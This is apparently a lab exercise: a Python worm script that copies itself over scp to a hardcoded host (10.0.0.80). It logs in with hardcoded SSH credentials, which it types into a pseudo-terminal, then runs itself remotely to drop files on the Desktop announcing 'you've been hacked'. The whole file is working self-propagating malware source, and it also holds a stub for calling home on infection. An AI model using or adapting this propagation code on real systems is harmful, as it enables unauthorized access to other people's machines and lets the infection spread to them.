import subprocess
import sys, pty, select, os

USER = "admin"
PASS = "hacklab"
PATH = "/home/admin/Desktop/"

def _waitfor(fd, expected):
    poll = select.poll()
    poll.register(fd, select.POLLIN)
    while True:
        evt = poll.poll()
        input = os.read(fd, 1024)
        for str in expected:
            if str.encode("utf-8") in input:
                return str

def ssh_auth(fd):
    waiting = True
    while waiting:
        response = _waitfor(fd, ["connected", "password"])
        if response == "connected":
            print(response)
            os.write(fd, "yes\n")
        elif response == "password":
            os.write(fd, (PASS + "\n").encode("utf-8"))
            waiting = False
    _, exit_status = os.wait()
    os.close(fd)

def scp_file(host, filename):
    pid, fd = pty.fork()
    # executed in child
    if pid == 0:
        os.execvp("scp", ["scp", filename, USER+"@"+host+":"+PATH])

    # executed in parent
    elif pid > 0:
        ssh_auth(fd)

def exec_worm(host):
    print("ssh", USER+"@"+host, "'python3 " + PATH + "worm.py payload'")

    pid, fd = pty.fork()
    # executed in child
    if pid == 0:
        os.execvp("ssh", ["ssh", USER+"@"+host, "'python3 " + PATH + "worm.py payload'"])

    # executed in parent
    elif pid > 0:
        ssh_auth(fd)

def infected():
    # call back to server to say host is infected
    pass

def payload():
    path = "/home/admin/Desktop/"
    for i in range(30):
        subprocess.run(["touch",
            "{}{}1 you've".format(path, str(i)),
            "{}{}2 been".format(path, str(i)),
            "{}{}3 hacked".format(path, str(i))])

if __name__ == "__main__":
    if sys.argv[1] == "payload":
        payload()
    elif sys.argv[1] == "propagate":
        print("Propagating...")
        scp_file('10.0.0.80', "worm.py")
    elif sys.argv[1] == "ssh":
        scp_file("10.0.0.80", "worm.py")
        exec_worm("10.0.0.80")
